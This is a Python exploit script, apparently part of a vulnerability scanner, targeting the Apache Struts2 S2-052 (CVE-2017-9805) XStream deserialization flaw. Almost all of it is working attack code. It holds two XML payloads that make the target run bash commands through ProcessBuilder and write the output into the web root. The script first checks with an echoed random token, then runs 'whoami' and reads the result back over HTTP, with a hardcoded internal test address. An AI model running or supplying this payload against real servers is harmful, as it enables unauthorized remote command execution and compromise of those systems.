#!/usr/bin/env python3

'''
name: Struts2 S2-052漏洞，又名CVE-2017-9805漏洞
description: Struts2 S2-052漏洞可执行任意命令
'''

import urllib
from urllib.parse import urlparse
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_052_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta() 
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Content-Type': "application/xml",
                  }
        self.check_payload ='''
                    <map>
                        <entry>
                            <jdk.nashorn.internal.objects.NativeString>
                            <flags>0</flags>
                            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                                <dataHandler>
                                <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                                    <is class="javax.crypto.CipherInputStream">
                                    <cipher class="javax.crypto.NullCipher">
                                        <initialized>false</initialized>
                                        <opmode>0</opmode>
                                        <serviceIterator class="javax.imageio.spi.FilterIterator">
                                        <iter class="javax.imageio.spi.FilterIterator">
                                            <iter class="java.util.Collections$EmptyIterator"/>
                                            <next class="java.lang.ProcessBuilder">
                                            <command>
                                                <string>bash</string>
                                                <string>-c</string>
                                                <string>%s >./webapps/ROOT/check.txt</string>
                                            </command>
                                            <redirectErrorStream>false</redirectErrorStream>
                                            </next>
                                        </iter>
                                        <filter class="javax.imageio.ImageIO$ContainsFilter">
                                            <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                            </method>
                                            <name>foo</name>
                                        </filter>
                                        <next class="string">foo</next>
                                        </serviceIterator>
                                        <lock/>
                                    </cipher>
                                    <input class="java.lang.ProcessBuilder$NullInputStream"/>
                                    <ibuffer></ibuffer>
                                    <done>false</done>
                                    <ostart>0</ostart>
                                    <ofinish>0</ofinish>
                                    <closed>false</closed>
                                    </is>
                                    <consumed>false</consumed>
                                </dataSource>
                                <transferFlavors/>
                                </dataHandler>
                                <dataLen>0</dataLen>
                            </value>
                            </jdk.nashorn.internal.objects.NativeString>
                            <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
                        </entry>
                        <entry>
                            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                        </entry>
                    </map>
                ''' % ('echo ' + self.capta)

        self.cmd_payload ='''
                    <map>
                        <entry>
                            <jdk.nashorn.internal.objects.NativeString>
                            <flags>0</flags>
                            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                                <dataHandler>
                                <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                                    <is class="javax.crypto.CipherInputStream">
                                    <cipher class="javax.crypto.NullCipher">
                                        <initialized>false</initialized>
                                        <opmode>0</opmode>
                                        <serviceIterator class="javax.imageio.spi.FilterIterator">
                                        <iter class="javax.imageio.spi.FilterIterator">
                                            <iter class="java.util.Collections$EmptyIterator"/>
                                            <next class="java.lang.ProcessBuilder">
                                            <command>
                                                <string>bash</string>
                                                <string>-c</string>
                                                <string>%s >./webapps/ROOT/cmd.txt</string>
                                            </command>
                                            <redirectErrorStream>false</redirectErrorStream>
                                            </next>
                                        </iter>
                                        <filter class="javax.imageio.ImageIO$ContainsFilter">
                                            <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                            </method>
                                            <name>foo</name>
                                        </filter>
                                        <next class="string">foo</next>
                                        </serviceIterator>
                                        <lock/>
                                    </cipher>
                                    <input class="java.lang.ProcessBuilder$NullInputStream"/>
                                    <ibuffer></ibuffer>
                                    <done>false</done>
                                    <ostart>0</ostart>
                                    <ofinish>0</ofinish>
                                    <closed>false</closed>
                                    </is>
                                    <consumed>false</consumed>
                                </dataSource>
                                <transferFlavors/>
                                </dataHandler>
                                <dataLen>0</dataLen>
                            </value>
                            </jdk.nashorn.internal.objects.NativeString>
                            <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
                        </entry>
                        <entry>
                            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                        </entry>
                    </map>
                ''' % ('whoami')
                    

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.post(self.url, headers = self.headers, data = self.check_payload)
            hostname = urlparse(self.url).hostname
            port = urlparse(self.url).port
            url = 'http://' + str(hostname) + ':' + str(port)
            check_req1 = request.get(url + '/check.txt', headers = self.headers)
            if check_req1.status_code == 200 and self.capta in check_req1.text:
                cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_payload)
                cmd_req1 = request.get(url + '/cmd.txt', headers = self.headers)
                print ('存在S2-052漏洞,执行whoami的结果为:', cmd_req1.text)
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_052 = S2_052_BaseVerify('http://192.168.30.242:8080/orders/3/edit')
    S2_052.run()


